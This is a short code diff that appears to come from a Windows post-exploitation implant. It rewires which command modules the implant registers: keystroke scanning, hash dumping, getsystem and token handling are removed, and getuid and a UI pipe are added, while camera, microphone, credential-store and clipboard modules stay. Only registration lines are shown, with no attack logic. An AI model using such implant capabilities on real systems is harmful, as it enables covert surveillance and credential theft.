@@ -62,14 +62,10 @@
 #include "windows/uac.h"
 #include "windows/cam.h"
 #include "windows/mic.h"
-#include "windows/uictl.h"
-#include "windows/keyscan.h"
-#include "windows/hashdump.h"
-#include "windows/getsystem.h"
 #include "windows/clipboard.h"
 #include "windows/credstore.h"
 #include "windows/services.h"
-#include "windows/token.h"
+#include "windows/getuid.h"
 #endif
 
 void register_api_calls(api_calls_t **api_calls)
@@ -110,14 +106,10 @@ void register_api_calls(api_calls_t **api_calls)
     register_uac_api_calls(api_calls);
     register_cam_api_calls(api_calls);
     register_mic_api_calls(api_calls);
-    register_uictl_api_calls(api_calls);
-    register_keyscan_api_calls(api_calls);
-    register_hashdump_api_calls(api_calls);
-    register_getsystem_api_calls(api_calls);
     register_clipboard_api_calls(api_calls);
     register_credstore_api_calls(api_calls);
     register_services_api_calls(api_calls);
-    register_token_api_calls(api_calls);
+    register_getuid_api_calls(api_calls);
 #endif
 }
 
@@ -143,6 +135,7 @@ void register_api_pipes(pipes_t **pipes)
 #ifdef __windows__
     register_cam_api_pipes(pipes);
     register_mic_api_pipes(pipes);
+    register_ui_api_pipes(pipes);
 #endif
 }
 
